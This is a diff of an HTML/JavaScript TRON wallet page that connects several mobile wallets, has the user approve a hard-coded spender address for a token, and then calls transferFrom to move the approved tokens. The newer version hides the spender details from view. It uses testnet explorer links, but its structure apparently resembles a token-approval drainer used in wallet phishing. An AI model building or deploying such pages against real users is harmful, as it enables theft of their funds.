@@ -1,178 +1,100 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="zh">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>TRON 多钱包授权 DApp</title>
+<style>
+body { font-family: Arial, sans-serif; padding: 20px; background: #f8f9fa; }
+button { padding: 10px 15px; margin: 5px; font-size: 16px; cursor: pointer; }
+#status { margin-top: 20px; padding: 10px; background: white; border-radius: 6px; min-height: 40px; }
+.success { color: green; }
+.error { color: red; white-space: pre-wrap; }
+a { color: blue; text-decoration: underline; }
+</style>
 </head>
 <body>
-  <h2>TRON 多钱包授权 DApp</h2>
-  <div id="addr">未连接</div>
-  <div id="network">未知</div>
-  <button id="connectBtn">连接钱包</button>
-  <button id="disconnectBtn">断开连接</button>
-  <hr/>
-  <pre id="params"></pre>
-  <button id="approveBtn">Approve</button>
-  <button id="allowanceBtn">查看授权额度</button>
-  <button id="transferBtn">Transfer</button>
-  <button id="transferFromBtn">TransferFrom</button>
-  <div id="status">状态：等待</div>
+<h2>TRON 多钱包授权 DApp</h2>
+<p>支持 TronLink, TokenPocket, imToken, TrustWallet</p>
+<button onclick="connectWallet()">连接钱包</button>
+<button onclick="approve()">授权</button>
+<button onclick="transferFrom()">转账(使用授权)</button>
+<div id="status"></div>
 
-<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
 <script>
-// CONFIG
-const DAPP_URL = "https://marker8573.github.io/TrxAproval/";
-const CONTRACT_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
-const SPENDER_ADDRESS = "TU2RPHf949o8QcESqXpCicXeRVfijj6D3k";
-const RECIPIENT_ADDRESS = "TMha7c19AkZ9Zg4WTqNHSucBviFHUBPUqk";
-const DECIMALS = 6;
-const APPROVE_AMOUNT = "100";
-const TRANSFER_AMOUNT = "5";
-const TRONSCAN_TX_PREFIX = "https://nile.tronscan.org/#/transaction/";
+const tokenAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
+const spenderAddress = "TU2RPHf949o8QcESqXpCicXeRVfijj6D3k";
+const amount = "1000"; // 授权金额，按代币精度设置
 
-// helpers
-const $ = id => document.getElementById(id);
-function setStatus(msg){ $("status").innerHTML = msg; }
-function humanToUnits(s){ const parts = String(s).split('.'); const ip = parts[0]||'0'; const frac = (parts[1]||'').padEnd(DECIMALS,'0').slice(0,DECIMALS); return BigInt(ip+frac); }
-function unitsToHuman(bn){ const s=bn.toString(); if(DECIMALS===0) return s; const p=s.padStart(DECIMALS+1,'0'); const i=p.slice(0,-DECIMALS); const f=p.slice(-DECIMALS).replace(/0+$/,''); return f? i+'.'+f : i; }
-
-$("params").textContent = `DApp: ${DAPP_URL}\nToken: ${CONTRACT_ADDRESS}\nSpender: ${SPENDER_ADDRESS}\nRecipient: ${RECIPIENT_ADDRESS}\nDecimals: ${DECIMALS}\nApproveAmount: ${APPROVE_AMOUNT}\nTransferAmount: ${TRANSFER_AMOUNT}`;
-
-let tron = null;
-
-function detectInjected(){
-  if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) return window.tronWeb;
-  if(window.tronLink && window.tronLink.tronWeb) return window.tronLink.tronWeb;
-  if(window.tronWebObj) return window.tronWebObj;
-  return null;
+function logStatus(msg, type="") {
+    const el = document.getElementById("status");
+    el.innerHTML = msg;
+    el.className = type;
 }
 
-let poll=null;
-function startPolling(){
-  let attempts=0;
-  poll = setInterval(()=>{
-    attempts++;
-    const inj = detectInjected();
-    if(inj){
-      tron = inj;
-      clearInterval(poll);
-      onReady();
+async function connectWallet() {
+    if (!window.tronWeb) {
+        logStatus("未检测到 Tron 钱包，请在 TronLink/TP/imToken DApp 浏览器打开", "error");
+        return;
     }
-    if(attempts>60){ clearInterval(poll); showDeeplink(); }
-  },500);
-}
-
-function onReady(){
-  $("addr").textContent = tron.defaultAddress.base58 || '未解锁';
-  $("network").textContent = tron.fullNode? tron.fullNode.host : '已注入';
-  setStatus("钱包已就绪: " + $("addr").textContent);
-}
-
-function showDeeplink(){
-  setStatus("未检测到钱包注入，请用钱包 DApp 浏览器打开或使用 deep link");
-  // create links for TP / TronLink / imToken / Trust
-  const tp = `tpoutside://pull.activity?params=${encodeURIComponent(JSON.stringify({url:DAPP_URL,chain:'TRON'}))}`;
-  const tronlink = `tronlinkoutside://open?url=${encodeURIComponent(DAPP_URL)}`;
-  const imtoken = `imtokenv2://navigate?screen=dapp&url=${encodeURIComponent(DAPP_URL)}`;
-  const trust = `trust://browser_enable?url=${encodeURIComponent(DAPP_URL)}`;
-  const links = document.createElement('div');
-  links.innerHTML = `<p><a href="${tp}">在 TokenPocket 中打开</a></p><p><a href="${tronlink}">在 TronLink 中打开</a></p><p><a href="${imtoken}">在 imToken 中打开</a></p><p><a href="${trust}">在 TrustWallet 中打开</a></p>`;
-  document.body.appendChild(links);
-  QRCode.toDataURL(DAPP_URL).then(url=>{ const img = document.createElement('img'); img.src=url; img.style.maxWidth='220px'; document.body.appendChild(img); });
-}
-
-// connect manually (TronLink)
-async function connectWallet(){
-  try{
-    if(window.tronLink && window.tronLink.request){
-      await window.tronLink.request({ method: 'tron_requestAccounts' });
-      tron = detectInjected();
-    } else if(window.tronWeb && window.tronWeb.defaultAddress){
-      tron = window.tronWeb;
-    } else {
-      setStatus("无法请求钱包，请在钱包 DApp 浏览器中打开");
-      return;
+    try {
+        if (window.tronWeb.request) {
+            await window.tronWeb.request({ method: 'tron_requestAccounts' });
+        }
+        const addr = window.tronWeb.defaultAddress.base58;
+        logStatus("已连接钱包: " + addr, "success");
+    } catch (e) {
+        logStatus("连接钱包失败: " + e.message, "error");
     }
-    onReady();
-  }catch(e){
-    console.error(e);
-    setStatus("连接失败: " + (e.message||e));
-  }
 }
 
-function disconnectWallet(){ tron=null; setStatus("已断开（请在钱包中移除授权以彻底断开）"); startPolling(); }
+function approve() {
+    if (!window.tronWeb) return logStatus("钱包未连接", "error");
 
-async function getContract(){ if(!tron) throw new Error("钱包未就绪"); return await tron.contract().at(CONTRACT_ADDRESS); }
+    const handleError = (err) => logStatus("授权失败: " + (err && err.message ? err.message : JSON.stringify(err)), "error");
+    const handleSuccess = (txHash) => {
+        const url = `https://nile.tronscan.org/#/transaction/${txHash}`;
+        logStatus(`授权成功! <a href="${url}" target="_blank">${txHash}</a>`, "success");
+    };
 
-async function doApprove(){
-  try{
-    setStatus("发送授权交易中...");
-    const c = await getContract();
-    const tx = await c.approve(SPENDER_ADDRESS, humanToUnits(APPROVE_AMOUNT).toString()).send();
-    const txHash = typeof tx==='string'? tx : (tx.txID||tx.transaction||tx.hash||JSON.stringify(tx));
-    setStatus('授权已发送，TxHash: <a href="'+TRONSCAN_TX_PREFIX+txHash+'" target="_blank">'+txHash+'</a>');
-  }catch(e){
-    console.error(e);
-    setStatus('授权失败: ' + (e.message||JSON.stringify(e)));
-  }
+    window.tronWeb.contract().at(tokenAddress, function(err, contract) {
+        if (err) return handleError(err);
+        try {
+            // 回调模式，兼容 imToken
+            contract.approve(spenderAddress, amount).send({}, function(err, txHash) {
+                if (err) return handleError(err);
+                handleSuccess(txHash);
+            });
+        } catch (e) {
+            handleError(e);
+        }
+    });
 }
 
-async function doAllowance(){
-  try{
-    setStatus("查询授权中...");
-    const c = await getContract();
-    const owner = tron.defaultAddress.base58;
-    const r = await c.allowance(owner, SPENDER_ADDRESS).call();
-    let raw = r?.remaining ?? r;
-    if(typeof raw==='object'){
-      if(raw._hex) raw = BigInt(raw._hex);
-      else if(raw._str) raw = BigInt(raw._str);
-      else raw = BigInt(String(raw));
-    } else if(typeof raw==='string') raw = BigInt(raw);
-    const human = unitsToHuman(raw);
-    setStatus("当前授权额度: " + human);
-  }catch(e){
-    console.error(e);
-    setStatus("查询失败: " + (e.message||JSON.stringify(e)));
-  }
+function transferFrom() {
+    if (!window.tronWeb) return logStatus("钱包未连接", "error");
+
+    const from = "替换成授权人的地址";
+    const to = "替换成接收人的地址";
+
+    const handleError = (err) => logStatus("转账失败: " + (err && err.message ? err.message : JSON.stringify(err)), "error");
+    const handleSuccess = (txHash) => {
+        const url = `https://nile.tronscan.org/#/transaction/${txHash}`;
+        logStatus(`转账成功! <a href="${url}" target="_blank">${txHash}</a>`, "success");
+    };
+
+    window.tronWeb.contract().at(tokenAddress, function(err, contract) {
+        if (err) return handleError(err);
+        try {
+            contract.transferFrom(from, to, amount).send({}, function(err, txHash) {
+                if (err) return handleError(err);
+                handleSuccess(txHash);
+            });
+        } catch (e) {
+            handleError(e);
+        }
+    });
 }
-
-async function doTransfer(){
-  try{
-    setStatus("发送 transfer 交易中...");
-    const c = await getContract();
-    const tx = await c.transfer(RECIPIENT_ADDRESS, humanToUnits(TRANSFER_AMOUNT).toString()).send();
-    const txHash = typeof tx==='string'? tx : (tx.txID||tx.transaction||tx.hash||JSON.stringify(tx));
-    setStatus('Transfer 已发送，TxHash: <a href="'+TRONSCAN_TX_PREFIX+txHash+'" target="_blank">'+txHash+'</a>');
-  }catch(e){
-    console.error(e);
-    setStatus('Transfer 失败: ' + (e.message||JSON.stringify(e)));
-  }
-}
-
-async function doTransferFrom(){
-  try{
-    const from = prompt("请输入 owner 地址（被从该地址转出代币）:","");
-    if(!from) return setStatus("取消 transferFrom");
-    setStatus("发送 transferFrom 交易中...");
-    const c = await getContract();
-    const tx = await c.transferFrom(from, RECIPIENT_ADDRESS, humanToUnits(TRANSFER_AMOUNT).toString()).send();
-    const txHash = typeof tx==='string'? tx : (tx.txID||tx.transaction||tx.hash||JSON.stringify(tx));
-    setStatus('transferFrom 已发送，TxHash: <a href="'+TRONSCAN_TX_PREFIX+txHash+'" target="_blank">'+txHash+'</a>');
-  }catch(e){
-    console.error(e);
-    setStatus('transferFrom 失败: ' + (e.message||JSON.stringify(e)));
-  }
-}
-
-document.getElementById('connectBtn').addEventListener('click', connectWallet);
-document.getElementById('disconnectBtn').addEventListener('click', disconnectWallet);
-document.getElementById('approveBtn').addEventListener('click', doApprove);
-document.getElementById('allowanceBtn').addEventListener('click', doAllowance);
-document.getElementById('transferBtn').addEventListener('click', doTransfer);
-document.getElementById('transferFromBtn').addEventListener('click', doTransferFrom);
-
-startPolling();
 </script>
+</body>
+</html>
